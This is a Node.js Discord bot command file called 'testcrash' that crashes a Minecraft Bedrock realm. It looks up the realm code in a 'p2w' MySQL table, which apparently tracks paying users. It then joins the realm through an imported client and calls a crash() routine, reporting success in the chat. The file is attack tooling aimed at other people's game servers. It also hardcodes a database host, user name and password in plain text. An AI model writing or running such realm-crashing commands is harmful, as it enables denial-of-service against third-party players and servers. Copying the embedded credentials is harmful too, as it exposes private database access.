const { join } = require('../bedrockClient.js');
const mysql = require('mysql2/promise');

module.exports = {
    name: "testcrash",
    description: "Crashes a realm code",
    options: [
        {
            type: "STRING",
            name: "realmcode",
            description: "Realm Code To Crash",
            required: true,
            min_length: 11,
            max_length: 11
        }
    ],
    level: 1,
    async execute(interaction, client) {
        const realmCode = interaction.options.getString('realmcode');

        // Connect to the MySQL database
        const dbConnection = await mysql.createConnection({
            host: '10.2.0.35',
            user: 'yarn',
            password: 'XF8kH7LTQIuzjFQ_',
            database: 'yarn'
        });

        // Retrieve realm information from the p2w table
        const [results] = await dbConnection.execute(
            'SELECT * FROM p2w WHERE realmcode = ?',
            [realmCode]
        );

        // Close the database connection
        dbConnection.end();

        if (results.length === 0) {
            // Realm code not found in the p2w table
            interaction.reply('Realm code not found in the p2w table.');
            return;
        }

        // Realm code found in the p2w table then say joining
        let messageData = { embeds:[
            {
                description: `${client.config.emojis.loading} Joining \`${realmCode}\`...`,
                footer: ({ text: `/${this.name} | Command used by ${interaction.user.tag}`, iconURL: interaction.user.displayAvatarURL() }),
                color: 1286414
            } 
        ]}
    
        let message = await interaction.reply(messageData);
        
        let connections = await join(realmCode, 1, (data)=>{
            if (data.disconnect_reason=="close") {
                messageData.embeds[0].description = `${client.config.emojis.success} Crashed \`${realmCode}\`!`
                messageData.embeds[0].color = 1286414
                message.edit(messageData);
                return;
            }
            messageData.embeds[0].description = `${client.config.emojis.leave} Disconnected from \`${realmCode}\`!\n\`\`\`${data.msg}\`\`\``
            messageData.embeds[0].color = 16724787
            if (messageData.components) messageData.components[0].components[0].disabled = true
            message.edit(messageData);
        }).catch(e => {
            messageData.embeds[0].description = `${client.config.emojis.error} Failed to join \`${realmCode}\`!\n${e.msg}\nErrors:\n\`${e.errors.join('`\n`')}\``
            messageData.embeds[0].color = 16724787
            message.edit(messageData);
        });
        if (!connections) return;
    
        messageData.embeds[0].description = `${client.config.emojis.join} Joined \`${realmCode}\`!`
        message.edit(messageData);
    
        connections.crash();
        connections.mcClients.forEach(client => {
            console.log('Client: ' + client.username + ' is crashing the server!')
        });    
    }
};